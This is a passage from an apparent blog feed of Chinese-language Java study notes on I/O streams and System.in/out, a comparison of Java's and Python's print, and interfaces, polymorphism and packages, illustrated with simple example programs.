    <content><![CDATA[<h4 id="一、Java中的流的概念"><a href="#一、Java中的流的概念" class="headerlink" title="一、Java中的流的概念"></a><font color="#EE3A8C" face="楷体">一、Java中的流的概念</font></h4><h5 id="1-0-数据流的概念"><a href="#1-0-数据流的概念" class="headerlink" title="1.0 数据流的概念"></a><font color="#EE3A8C" face="楷体">1.0 数据流的概念</font></h5><blockquote>
<blockquote>
<p><font face="楷体">&amp;emsp;数据流是一串连续不断的数据的集合，就象水管里的水流，在水管的一端一点一点地供水，而在水管的另一端看到的是一股连续不断的水流。数据写入程序可以是一段、一段地向数据流管道中写入数据，这些数据段会按先后顺序形成一个长的数据流。对数据读取程序来说，看不到数据流在写入时的分段情况，每次可以读取其中的任意长度的数据，但只能先读取前面的数据后，再读取后面的数据。不管写入时是将数据分多次写入，还是作为一个整体一次写入，读取时的效果都是完全一样的。<br>&amp;emsp;“流是磁盘或其它外围设备中存储的数据的源点或终点。”<br>在电脑上的数据有三种存储方式，一种是外存，一种是内存，一种是缓存。比如电脑上的硬盘，磁盘，U盘等都是外存，在电脑上有内存条，缓存是在CPU里面的。外存的存储量最大，其次是内存，最后是缓存，但是外存的数据的读取最慢，其次是内存，缓存最快。这里总结从外存读取数据到内存以及将数据从内存写到外存中。对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。那又怎样把放在外存这个容器内的数据读取到内存这个容器以及怎么把内存这个容器里的数据存到外存中呢？<br>&amp;emsp;在Java类库中，IO部分的内容是很庞大的，因为它涉及的领域很广泛:<br>标准输入输出，文件的操作，网络上的数据流，字符串流，对象流，zip文件流等等，java中将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。<br>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</font></p>
</blockquote>
</blockquote>
<pre><code>  以上总结的基本概念如下：
</code></pre>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌸数据流：一组有序，有起点和终点的字节的数据序列。包括输入流和输出流;
🌸输入流(Input  Stream)：程序从输入流读取数据源。数据源包括外界(键盘、文件、网络…)，即是将数据源读入到程序的通信通道;
🌸输出流：程序向输出流写入数据。将程序中的数据输出到外界（显示器、打印机、文件、网络…）的通信通道。采用数据流的目的就是使得输出输入独立于设备。
Input  Stream不关心数据源来自何种设备（键盘，文件，网络）
Output  Stream不关心数据的目的是何种设备（键盘，文件，网络）
🌸数据流分类：流序列中的数据既可以是未经加工的原始二进制数据，也可以是经一定编码处理后符合某种格式规定的特定数据。因此Java中的流分为两种：
 1)  字节流：数据流中最小的数据单元是字节；
 2)  字符流：数据流中最小的数据单元是字符，Java中的字符是Unicode编码，一个字符占用两个字节。
🌸具体的字节流和字符流区分请看文章《Java:字节流和字符流（输入流和输出流）》和[《Java 字节流与字符流的区别》](https://blog.csdn.net/qq_25184739/article/details/51203733)、[《理解Java中字符流与字节流的区别》](https://www.cnblogs.com/absfree/p/5415092.html)、[《Java:字节流和字符流（输入流和输出流）》](https://www.cnblogs.com/progor/p/9357676.html).
</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="二、System、in、out说明"><a href="#二、System、in、out说明" class="headerlink" title="二、System、in、out说明"></a><font color="#EE3A8C" face="楷体">二、System、in、out说明</font></h4><p><font face="楷体">Java系统自带的标准数据流：java.lang.System:</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java.lang.System     </span><br><span class="line">public final class System  extends Object&#123;     </span><br><span class="line">   static  PrintStream  err;//标准错误流（输出）、err是对象；  </span><br><span class="line">   static  InputStream  <span class="keyword">in</span>;//标准输入(键盘输入流)、<span class="keyword">in</span>是对象；   </span><br><span class="line">   static  PrintStream  out;//标准输出流(显示器输出流)、out是对象.</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System类不能创建对象，只能直接使用它的三个静态成员;
🌼 每当main方法被执行时,就自动生成上述三个对象;
🌼 System是java.lang包里面的一个类；
🌼 in是java.io.InputStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 read()是java.io.InputStream类里的方法，也就是in对象的方法;
🌼 out是java.io.PrintStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 print()、println()是java.io.PrintStream类里的方法，也就是out对象的方法;
</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="三、System-in-read-使用"><a href="#三、System-in-read-使用" class="headerlink" title="三、System.in.read()使用"></a><font color="#EE3A8C" face="楷体">三、System.in.read()使用</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.in.read()方法的作用是按每次读取一个字节（就是ASCII码），然后返回它的<font color="#FF4040">ASCII码十进制</font>;
🌼 从第一次打开System.in输入流开始，以后输入的字节都存放起来，下次从这个里面依次按顺序读取;
🌼 用System.in.read()时，我们在键盘上按下的任何一个键都会被当做是输入值，包括Enter键也会被当做是一个值！当我们按下Enter的时候，实际上发送两个键值：一个回车\t（13），一个是换行\n（10）;
🌼 从键盘输入一个a，char是两个字节存储的，read()一个字节一个字节读取时，暂时把a看作是一个字节，后续深入学习了再来解释😫😂（哈，貌似想通了，当字节流读到字节为0的数据流时会舍去，相当于跳过该字节继续读下一个非0的字节.....后续更新中）----12.27与老师探讨后得知：在流中输入的字符是一个ASCII(即一个字节=8比特)，这个时候就是一个字节，而char存储的时候是按2个字节存储的，注意的是在流中并不是存储，存储一个字符是Unicode码共16位，而流中的ASCII是8位。
建议去读[《java总结输入流输出流》](https://blog.csdn.net/liuxiaogangqq/article/details/25892667)！！！
可参考[Scanner使用方法](https://www.cnblogs.com/ioveNature/p/6797024.html)</font></td></tr></table>

<p><strong>注意事项：</strong></p>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">1、由于在控制台输入时，按下回车键才代表输入完成，输入的内容才会提交到read()方法，所以按下回车之前，程序是不知道你输入了什么的;
2、输入"a"后按下回车，这时候read()方法读到了数据，此时buffer中的数据应该是97 13 10，也就是字符'a','\r','\n'，并且read()方法每次只能从缓冲区中读出一个字符，三次read()就刚好读出这3个字符，之后程序就结束了;
3、只按下回车，此时从流中只读到了"\r"和"\n"，由于没有足够的输入，那么第三次调用read()时阻塞.
参考：[《System.in.read()使用》](https://uule.iteye.com/blog/1128243)；[《System.in输入流深入理解》](https://blog.csdn.net/fengzijinliang/article/details/40741565?utm_source=blogxgwz0)
推荐阅读：[《深入理解JAVA中的IO》](https://www.cnblogs.com/ylspace/p/8128112.html)</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="四、System-out-print-x2F-println"><a href="#四、System-out-print-x2F-println" class="headerlink" title="四、System.out.print()&#x2F;println()"></a><font color="#EE3A8C" face="楷体">四、System.out.print()&#x2F;println()</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.out.print()输出不换行，System.out.print()输出后换行.
参考[《深入理解System.out.print》](https://blog.csdn.net/idealemail/article/details/47318813).</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="五、Java中System-out-print-函数与Python中print-函数的详解"><a href="#五、Java中System-out-print-函数与Python中print-函数的详解" class="headerlink" title="五、Java中System.out.print()函数与Python中print()函数的详解"></a><font color="#EE3A8C" face="楷体">五、Java中System.out.print()函数与Python中print()函数的详解</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">python中的print()函数和java中的System.out.print()函数都有着打印字符串的功能。
(1). <font color="red">python中:</font> print("hello,world!")
输出为：hello,world!
<font color="red">Java中:</font> System.out.print("hello,world!");
输出为：hello,world!
说明这两个函数的用法是一样的.
(2). <font color="red">python中:</font> print("1+1=",1+1)
输出结果为：1+1= 2
<font color="red">Java中:</font> System.out.print("1+1="+(1+1));
输出结果为：1+1=2
说明在使用print()函数的时候，我们用了一个“,”将“1+1=”和1+1的结果连接起来了，这个“,”起着连接的作用。同时，在使用System.out.print()函数的时候，我们用了一个“+”将“1+1=”和1+1的结果连接起来了，这个“+”也是起着连接作用;
我们再来看他们的输出结果，print()输出的是1+1= 2，“=”与“2”之间有一个空格，而System.out.print()输出的是1+1=2，“=”与“2”之间没有空格。这里我们发现python中的print()函数中的“,”不仅起着连接字符串的作用，而且还表示一个空格.

<p><strong>结论：</strong><br><font color="#FF0000">🌼 python中的print()函数的作用和java中的System.out.print()函数的作用是一样的;<br>🌼 print()函数中“,”和System.out.print()函数中“+”都有着连接字符串的作用;<br>🌼 print()函数中“,”还表示一个空格;<br>🌼 不同的语言都有着很多的相似点，不同的语言又有着不同的新特性.</font><br>参考：<a href="https://m.jb51.net/article/128959.htm">《python中print()函数的“,”与java中System.out.print()函数中的“+”功能详解》</a>.<br></font></td></tr></table></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java接口、包(4.7-4.8)</title>
    <url>/post/Java-Interface-Package5/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>接口 & 包</font></center>

<p>&amp;emsp;</p>
<h3 id="一、-接口"><a href="#一、-接口" class="headerlink" title="一、 接口"></a><font color="#FF6347" face="Comic sans MS">一、 接口</font></h3><h4 id="1-1-接口的概念"><a href="#1-1-接口的概念" class="headerlink" title="1.1  接口的概念"></a><font color="#20B2AA" face="Comic sans MS">1.1  接口的概念</font></h4><p><font face="Comic sans MS"><strong>1.  📒使程序设计和实现相互分离：</strong><br>在单继承的继承树中，设计和实现不可避免地要纠缠在一起。在设计的时候，人们也许只想提供一个类的抽象的接口，而不希望去具体实现它，因为那是实现阶段的事情。使用接口类型可以很完美地解决这个问题。</p>
<p><strong>2.📒弥补Java只支持单重继承的不足：</strong><br>   Java的类型层次结构具有一定的局限——它只支持单继承，一个类只能有一个父类，而不能交叉继承树的其它分支中有用的部分。这样就给面向对象的程序设计带来了一些困难。但是多继承的引入使得继承层次结构变得混乱，更加容易出错和产生二义性。</p>
<p><strong>3.📒约束实现接口的类</strong>:<br>接口只是约束实现了该接口的类必须满足接口的要求。<br>当定义一个接口时，实际上是在编写一个契约，用来描述实现其的类能够做什么，能够充当什么角色，具体怎么做和接口无关。</p>
<p><strong>所以，Java抛弃了多继承，引入一种新的层次结构——<font color="red">接口</font>来达到同样的功能。</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">📒**接口和类的区别：** </font> 
 (1) 类只能单继承，而接口可以多继承。
 (2) 类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的。
 (3) 接口中的方法要用类来实现，一个类可以实现多个接口。
<font color="red">📒**注意：**  </font> 
 (1) 接口可以继承：一个接口可以继承多个其它的接口，
 (2) 接口中的方法要用类来实现 。
 (3) 一个类可以实现多个接口 。
 (4) Java接口反映了对象较高层次的抽象，为描述相互似乎没有关系的对象的共性提供了一种有效的手段。</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-接口的说明"><a href="#1-2-接口的说明" class="headerlink" title="1.2  接口的说明"></a><font color="#20B2AA" face="Comic sans MS">1.2  接口的说明</font></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[修饰符] interface 接口名[extends] [接口列表]</span><br><span class="line">&#123;</span><br><span class="line">   接口体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1.  📒首部：</strong></font><br><strong>修饰符：</strong>或者不使用修饰符（同包访问），或者只能使用public（任意访问）。归结为只能使用public或者缺省.<br><strong>extends：</strong>定义父接口，支持多重继承(多个父接口用逗号分隔)<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;public interface Cookable extends Foodable,Printable</p>
<p><font color="#00B2EE"><strong>2.📒接口体：定义常量和抽象方法：</strong></font><br>&amp;emsp;<font color="red"><strong>接口的成员：成员变量和方法</strong></font><br><strong>(1) 接口中的成员变量：</strong>都是隐含public、static、final的——静态最终变量（常量），例如在接口中有下面这行代码：<br>int STEP&#x3D;5;<br>等同于：<br>public static final int STEP&#x3D;5;<br><strong>(2) 接口中的方法：</strong>接口中说明的方法都是抽象方法，所有方法隐含public和abstract的 ，例如 int increment(int x)；<br><font color="red">注意， 接口中的方法不能使用下面的修饰符：</font><br>     static<br>     native或synchronized<br>     final<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-接口的使用"><a href="#1-3-接口的使用" class="headerlink" title="1.3  接口的使用"></a><font color="#20B2AA" face="Comic sans MS">1.3  接口的使用</font></h4><p><font face="Comic sans MS">&amp;emsp;接口自己不能提供方法的实现，接口中的方法必须由类实现。Java语言用关键字implements声明类中将实现的接口。声明接口的形式：<br>&amp;emsp;&amp;emsp;<font color="#00B2EE">[类修饰符]  class类名  [extends子句]  [ implements 子句]</font><br><font color="red"><strong>注意：</strong></font><br>在implements子句中可以包含多个接口类型，各个接口类型之间用逗号隔开。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">19</span>]  TestInterface.java 接口的使用示例</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Runner</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Swimmer</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">Runner</span>,<span class="title">Swimmer</span> </span>&#123;</span><br><span class="line"><span class="comment">//Person是能跑和游泳的动物，所以继承了Animal，同时实现了Runner和Swimmer两个接口</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">&quot;run&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;swim&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;eat&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInterface</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		TestInterface t=<span class="keyword">new</span> TestInterface();</span><br><span class="line">		Person p=<span class="keyword">new</span> Person();</span><br><span class="line">		t.m1(p);</span><br><span class="line">		t.m2(p);</span><br><span class="line">		t.m3(p);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">(Runner f)</span></span>&#123;f.run();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">(Swimmer s)</span></span>&#123;s.swim();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">(Animal a)</span></span>&#123;a.eat();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-对接口的引用"><a href="#1-4-对接口的引用" class="headerlink" title="1.4  对接口的引用"></a><font color="#20B2AA" face="Comic sans MS">1.4  对接口的引用</font></h4><p><font face="Comic sans MS">&amp;emsp;(1) 接口可以作为一种引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，通过这些变量可以访问类所实现的接口中的方法。Java运行时系统动态地确定该使用哪个类中的方法。</p>
<p>&amp;emsp;(2) 把接口作为一种数据类型可以不需要了解对象所对应的具体的类，而着重于它的交互界面。例如，[例4-18]中Person类实现了Runner接口，可以如下赋值，和子类对象赋给父类对象是类似的：<br>          Runner r&#x3D;new Person();<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-使用接口实现多重继承"><a href="#1-5-使用接口实现多重继承" class="headerlink" title="1.5  使用接口实现多重继承"></a><font color="#20B2AA" face="Comic sans MS">1.5  使用接口实现多重继承</font></h4><p><font face="Comic sans MS">&amp;emsp;程序设计有时需要表达这样的意思：<br>&amp;emsp;&amp;emsp;<font color="#00B2EE"> “x从属于a，也从属于b，也从属于c” </font><br><strong>C++：</strong>多重继承，每个类都有具体的实施细节<br><strong>Java：</strong>接口，只有一个类有具体的实施细节<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/27/5c246b3100ab8.png" alt="图片1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">20</span>]  Swan.java 接口实现多重继承</span><br><span class="line"><span class="comment">/* Swan表示天鹅类，它继承了animal基础类，并实现了接口canWalk、canSwim、canFly，即天鹅具有</span></span><br><span class="line"><span class="comment">animal的功能，同时也具有行走、游泳和飞行的功能。这就实现了多重继承。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canWalk</span></span>&#123;   <span class="function"><span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canSwim</span></span>&#123; <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canFly</span></span>&#123;<span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">animal</span></span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swan</span> <span class="keyword">extends</span> <span class="title">animial</span> <span class="keyword">implements</span> <span class="title">canWalk</span>,<span class="title">canSwim</span>,<span class="title">canFly</span></span></span><br><span class="line"><span class="class"></span>&#123;	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     </span>&#123; System.out.println(<span class="string">&quot;swan walking!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan swimming!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan flying!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123; System.out.println(<span class="string">&quot;swan eating!&quot;</span>);&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Swan swan=<span class="keyword">new</span> Swan();</span><br><span class="line">		swan.walk();</span><br><span class="line">		swan.swim();</span><br><span class="line">		swan.fly();</span><br><span class="line">		swan.eat();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-抽象类和接口的选择"><a href="#1-6-抽象类和接口的选择" class="headerlink" title="1.6  抽象类和接口的选择"></a><font color="#20B2AA" face="Comic sans MS">1.6  抽象类和接口的选择</font></h4><p><font color="red"><em><strong>问题：接口和抽象类都可以使设计和实现分离，那么继承结构中的基础类应该定义成一个普通类、抽象类还是接口 ？？</strong></em></font><br><font face="Comic sans MS">(1) 在语法上都是可以的，但是把基础类定义成抽象类或接口往往会增加程序的灵活性和容错性；<br>(2) 如果基础类只是定义一些接口，根本不需要具体的实现，<font color="#00B2EE"> <strong>那么首先优先选择使用接口，接口的抽象程度比抽象类更高；</strong></font><strong>如果基础类必须实现方法或者定义成员变量的时候，才考虑采用抽象类。</strong></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-多态"><a href="#1-7-多态" class="headerlink" title="1.7  多态"></a><font color="#20B2AA" face="Comic sans MS">1.7  多态</font></h4><p><font face="Comic sans MS">📒<strong>多个类中的多态：</strong>在具有继承关系的多个类中，子类对父类方法的覆盖（不能是重载父类的方法），即子类和父类可以有相同首部的方法，运行的时间决定每个对象到底执行哪个特定的版本。<br>📒<strong>判断程序中是否存在多态：</strong><font color="red"><strong>继承(覆盖)、向上转型、动态绑定。</strong></font></p>
<p>&amp;emsp;<font color="red"><strong>1. 覆盖：</strong></font>前面已经讲过，如下：<br><img data-src="https://i.loli.net/2019/01/08/5c3473153aa24.png" alt="20-1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">21</span>] Shapes.java 多态性示例<span class="number">1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.draw()&quot;</span>);  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span>&#123;</span><br><span class="line">  s.draw();</span><br><span class="line">  s.erase();  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">  &#125;&#125;</span><br><span class="line">运行结果：</span><br><span class="line">Circle.draw()</span><br><span class="line">Circle.erase()</span><br><span class="line">Square.draw()</span><br><span class="line">Square.erase() </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<font color="red"><strong>2. 向上转型：</strong></font>子类对象可以直接转换成父类对象，即一个对象除了可以当作自己的类型，还可以作为它的基础类型对待，这种把子类型当作它的基本类型处理的过程，就叫作向上转型（即“Upcasting”）<br><strong>例如：</strong><br>Shape s&#x3D;new Circle();<br>Circle c&#x3D;new Circle();<br>Square s&#x3D;new Square();<br>doShape(c);<br>doShape(s);</p>
<p>&amp;emsp;<font color="red"><strong>3. 动态绑定：</strong></font><br>&amp;emsp;&amp;emsp;绑定：将一个方法调用同一个方法体连接起来<br>&amp;emsp;&amp;emsp;早期绑定：程序运行以前执行绑定；<br>&amp;emsp;&amp;emsp;动态绑定（或后期绑定）：在运行期间执行绑定。<br><font color="#00B2EE"><strong>Java支持动态绑定：能在运行期间判断参数的实际类型，并分别调用适当的方法体，从而实现了多态性。在Java中所有非final和非static的方法都会自动地进行动态绑定。</strong></font><br></font></p>
<p><em>如下代码块：</em><br><img data-src="https://i.loli.net/2018/12/27/5c24716ea85b2.png" alt="21"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.erase()&quot;</span>);  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	s.draw();</span><br><span class="line"> 	s.erase();	 </span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    Triangle t=<span class="keyword">new</span> Triangle();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">    doShape(t) ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-包"><a href="#二、-包" class="headerlink" title="二、 包"></a><font color="#FF6347" face="Comic sans MS">二、 包</font></h3><h4 id="2-1-包的说明和作用"><a href="#2-1-包的说明和作用" class="headerlink" title="2.1  包的说明和作用"></a><font color="#20B2AA" face="Comic sans MS">2.1  包的说明和作用</font></h4><p><font face="Comic sans MS"><strong>1. 📒包的说明：</strong><br>•    包是用于组织类的一种方式，可以对类进行分组，一个包中可以包含任意数量的类和接s口,本身是一种命名机制，具体的表现就是一个文件夹<br>•    包是一种松散的类的集合：一般不要求处于同一个包中的类有明确的相互关系，如包含、继承等，但是由于同一个包中的类在默认情况下可以相互访问，所以为了方便编程和管理，通常把需要在一起工作的类放在一个包里。</p>
<p><strong>2. 📒包的作用：</strong><br>（1）包能够让程序员将类组织成单元，通过文件夹或目录来组织文件和应用程序；<br>（2）包减少了名称冲突带来的问题，可以防止同名的类发生冲突；<br>（3）包能够更大面积的保护类、变量和方法，而不是分别对每个类进行保护；<br>（4）包可以用于标示类。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-包的创建"><a href="#2-2-包的创建" class="headerlink" title="2.2  包的创建"></a><font color="#20B2AA" face="Comic sans MS">2.2  包的创建</font></h4><p><font face="Comic sans MS"><strong>1. 📒无名包：</strong><br>&amp;emsp;&amp;emsp;系统为每个没有明确指明所属包的.java文件默认创建的包<br>&amp;emsp; &amp;emsp; <font color="#00B2EE"><strong>无名包中的类无法被引用和复用</strong></font></p>
<p><strong>2. 📒有名包：</strong><br>     （1）说明格式   package 包名；<br>       &amp;emsp;&amp;emsp; package SubClass;<br>       &amp;emsp;&amp;emsp; package MyClass.SubClass;<br>     （2）<font color="red"><strong>说明语句必须放在整个.java文件的第一行</strong></font> </p>
<p><strong>3. 📒创建包的含义：</strong><br>      &amp;emsp;创建包就是在当前文件夹下创建一个子文件夹，以便存放这个包中包含的所有类的.class文件.</p>
<p><strong>4.</strong> 📒可以在不同的文件中使用相同的包说明语句，这样就可以将不同文件中的类都包含到相同的程序包中.<br></font></p>
